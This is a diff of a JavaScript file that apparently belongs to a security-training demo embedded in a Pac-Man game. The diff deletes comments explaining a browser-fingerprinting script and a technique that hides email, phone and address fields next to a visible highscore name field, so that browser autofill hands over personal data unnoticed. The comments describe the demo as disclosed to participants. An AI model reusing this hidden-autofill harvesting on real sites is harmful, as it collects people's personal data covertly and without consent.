@@ -1,30 +1,6 @@
-// Client-side visitor-fingerprint capture for the IT-security training
-// demo (docs/3-apps-workloads/300f0-pacman-visitor-tracking.md). NOT part of the vendored
-// pacman-canvas game — added by us, injected server-side into index.htm
-// by main.go's serveIndexWithFingerprint() (keeps the vendored file
-// untouched for easier future re-vendoring).
-//
-// Everything here reads browser APIs a page can access without any
-// permission prompt (Geolocation/camera/mic APIs are deliberately NOT
-// used — those show a visible browser prompt, which would defeat the
-// "nobody notices" point of the demo) — plus one deliberately more
-// invasive technique (harvestAutofill): a real, visible "name for the
-// highscore list" field (genuinely plausible game UX) sitting in the
-// same <form> as invisible email/phone/address fields. A fully invisible
-// bait form doesn't work against modern Chrome — filling any field from
-// a saved profile requires an actual user click on the autofill
-// suggestion dropdown, which JS cannot trigger — but Chrome fills every
-// matching field in a form together once the user accepts one
-// suggestion, so the hidden fields can ride along with the visible one.
-// Scoped strictly to the training context described in docs/3-apps-workloads/300f0-pacman-visitor-tracking.md —
-// disclosed verbally to participants, then shown live via the Grafana
-// dashboard as the reveal.
 (function () {
   "use strict";
 
-  // FNV-1a 32-bit — fast, synchronous, no WebCrypto round-trip needed.
-  // Not cryptographic; only needs to differ between distinguishable
-  // inputs, which is all a fingerprint requires.
   function hashString(str) {
     var hash = 2166136261;
     for (var i = 0; i < str.length; i++) {
@@ -137,36 +113,6 @@
     }
   }
 
-  // Invisible (off-screen, not display:none — some browsers skip autofill
-  // on display:none/visibility:hidden fields) form baited with common
-  // autocomplete tokens. If the visitor's browser has a saved autofill
-  // profile, it fills these fields on its own — no typing, no visible
-  // form. This is the one technique here that can produce real personal
-  // data (name/email/phone) rather than just device characteristics.
-  // A fully invisible bait form (the original approach) doesn't work
-  // against modern Chrome: filling a field from a saved profile requires
-  // an actual user click on the autofill suggestion dropdown — no CSS
-  // trick or synthetic focus() bypasses that, it's a deliberate anti-abuse
-  // boundary, not a visibility check.
-  //
-  // This is the realistic version instead: one REAL, visible field
-  // ("Name für die Bestenliste", a normal highscore prompt — genuinely
-  // plausible game UX) that the visitor actually interacts with. The
-  // email/tel/address/postal fields sit in the *same* <form>, invisible,
-  // but Chrome's profile-autofill fills every matching field in a form
-  // together once the user picks one suggestion — so accepting the
-  // autofill suggestion for "Name" can pull the hidden fields along with
-  // it. This mirrors how real deceptive forms work (a plausible-looking
-  // single field hiding a bigger form), rather than a purely invisible
-  // attack — still fully disclosed afterward per docs/3-apps-workloads/300f0-pacman-visitor-tracking.md.
-  //
-  // NOTE: since then, the game gained a *real* leaderboard with its own
-  // page-load name field (src/nickname.js's #nickname-overlay, unrelated
-  // to this corner widget). That field runs the same hidden-field trick
-  // conditionally, gated behind window.PACMAN_TRAINING_MODE (off by
-  // default) — see nickname.js's addHiddenAutofillFields() and
-  // README.md's "Training Mode" section. This corner widget's own harvest
-  // below is unconditional regardless of that flag.
   function harvestAutofill(callback) {
     try {
       var wrap = document.createElement("div");
@@ -203,10 +149,6 @@
           "background:#ffcc00; color:#000; border:none; cursor:pointer;"
       );
 
-      // Same form as the visible name field, so a Chrome profile-autofill
-      // selection on "name" can fill these together — invisible, but not
-      // display:none/visibility:hidden (those are excluded from autofill
-      // entirely; zero-size + opacity:0 is not).
       var hiddenFields = [
         { name: "email", autocomplete: "email", type: "email" },
         { name: "tel", autocomplete: "tel", type: "tel" },
@@ -246,10 +188,6 @@
         finish();
       });
 
-      // Give the visitor a real chance to notice the prompt, interact
-      // with the name field (which is what actually triggers Chrome's
-      // autofill dropdown), and either submit or ignore it before we
-      // collect+remove it either way.
       setTimeout(finish, 15000);
     } catch (e) {
       callback(null);
